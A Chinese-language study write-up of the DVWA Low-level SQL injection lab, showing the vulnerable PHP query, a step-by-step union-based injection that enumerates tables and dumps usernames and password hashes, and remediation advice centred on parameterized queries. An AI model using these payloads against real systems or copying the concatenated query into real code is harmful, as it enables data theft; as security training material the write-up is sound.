# SQL 注入 — DVWA Low

!!! info "环境信息"

    靶场：DVWA（XAMPP + Apache + MariaDB）
    难度：Low
    地址：`http://localhost/dvwa/vulnerabilities/sqli/`
    工具：浏览器、手动构造 payload

---

## 一、漏洞原理

DVWA 的 SQL Injection 模块，后端代码大致是这样：

```php
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($connection, $query);
```

问题出在**用户输入被直接拼进了 SQL 语句字符串**。

正常请求 `id=1` 时，SQL 是：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1';
```

如果输入的是 `1' OR '1'='1`，语句就变成：

```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

`'1'='1'` 恒为真，`WHERE` 条件失效，**整张表的数据都会被返回**。

根本原因：**代码没有区分「数据」和「代码」**。用户输入本应只是数据，却因为字符串拼接获得了被当作 SQL 语法解析的能力。

---

## 二、利用过程

### 第 1 步：正常请求，确认参数

浏览器访问：

```
http://localhost/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit
```

返回一个用户的信息。说明 `id` 参数被用在查询里。

### 第 2 步：加一个单引号，试探注入点

输入框填：

```
1'
```

页面返回 SQL 语法错误：

```
Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL
syntax; check the manual that corresponds to your MariaDB server version...
```

**这个报错就是突破口。** 它证明了两件事：

1. 输入被直接拼进了 SQL 语句
2. 单引号闭合了原语句的引号，导致语法结构崩坏

同时说明是**字符型注入**（数字型不会因为单引号报错）。

### 第 3 步：判断字段数

用 `ORDER BY` 逐步试探：

```
1' ORDER BY 1 -- 
1' ORDER BY 2 -- 
1' ORDER BY 3 -- 
```

前两个正常，第三个报错 → **查询返回 2 个字段**。

!!! note "为什么用 `-- `"

    `--` 是 SQL 注释符，用来把原语句后面的部分注释掉，避免语法错误。

    注意 `--` 后面**必须有一个空格**，否则在 MySQL/MariaDB 里不生效。
    这是最容易踩的坑之一——不加空格会继续报语法错误，让人误以为方向错了。

### 第 4 步：确定回显位置

```
1' UNION SELECT 1,2 -- 
```

页面显示 `1` 和 `2` 的位置，就是两个可回显的字段。

### 第 5 步：读取数据库信息

把回显位置替换成要查的内容：

```sql
-- 当前数据库名和版本
1' UNION SELECT database(), version() -- 
```

### 第 6 步：逐步枚举数据

```sql
-- 当前库的所有表
1' UNION SELECT 1, group_concat(table_name) FROM information_schema.tables
   WHERE table_schema=database() -- 

-- users 表的字段名
1' UNION SELECT 1, group_concat(column_name) FROM information_schema.columns
   WHERE table_name='users' -- 

-- 最终：拖出账号和密码哈希
1' UNION SELECT user, password FROM users -- 
```

!!! tip "为什么常用 `id=-1`"

    把 `id` 设成一个不存在的值（如 `-1`），让原查询返回空，
    这样 `UNION` 的结果就不会和原始数据混在一起，页面更干净。

### 第 7 步：结果

成功拿到 `users` 表的所有用户名和密码哈希。

---

## 三、为什么能成功

| 环节 | 说明 |
|---|---|
| **输入未过滤** | 没有对 `id` 参数做类型校验（本应是整数） |
| **字符串拼接** | 用拼接而非参数化查询构造 SQL |
| **错误信息暴露** | 数据库报错直接返回给前端，帮助攻击者判断结构 |
| **权限过大** | 数据库连接账号可读 `information_schema`，泄漏全部表结构 |

这四条叠加，才构成一次完整的注入。

---

## 四、修复建议

### 方案 1：参数化查询（首选，唯一根治方案）

```php
$stmt = $connection->prepare(
    "SELECT first_name, last_name FROM users WHERE user_id = ?"
);
$stmt->bind_param("i", $id);   // "i" 表示整数
$stmt->execute();
```

**为什么这是根治**：数据库先把 SQL 结构编译好，再把用户输入当作**纯数据**填入。
输入永远无法变成语法——从结构上切断了注入的可能。

### 方案 2：输入类型校验（补充，不能单独用）

```php
if (!is_numeric($id)) {
    die("Invalid input");
}
$id = intval($id);
```

**只能作为纵深防御的一层。** 不是所有参数都是数字（比如搜索框），
而且黑名单式的过滤总有绕过方式。

### 方案 3：最小权限

给 Web 应用的数据库账号只授予必要的权限（`SELECT` / `INSERT`），
**不要用 root**，并禁止访问 `information_schema`。

这样即使被注入，能拿到的数据也被限制在一定范围内。

### 方案 4：关闭错误回显

```php
// 生产环境
ini_set('display_errors', 0);
```

错误信息应记录到日志，而不是返回给用户。减少信息泄漏。

### 方案 5：WAF（纵深防御）

可以拦截常见注入特征，但**不能依赖**——WAF 绕过手法一直在更新。

---

## 五、总结

| 要点 | 结论 |
|---|---|
| 漏洞本质 | 数据被当作代码执行 |
| 根本修复 | 参数化查询 |
| 常见误判 | 「只过滤单引号就够了」——宽字节、编码绕过都能突破 |
| 挖洞思路 | 先判断类型 → 字段数 → 回显位 → 逐步枚举 |

**我在这关学到的**：防御的核心不是「过滤坏字符」，而是**让数据和代码彻底分离**。
前者是黑名单思维，永远有漏网之鱼；后者是结构性的解决。

另一个体会是：`--` 后面那个空格看起来是小事，但它决定了你能不能继续往下走。
**渗透测试里大量时间花在这类细节上，而不是"高级技巧"。**

---

## 参考

- DVWA 官方仓库：<https://github.com/digininja/DVWA>
- PortSwigger SQL 注入专题：<https://portswigger.net/web-security/sql-injection>
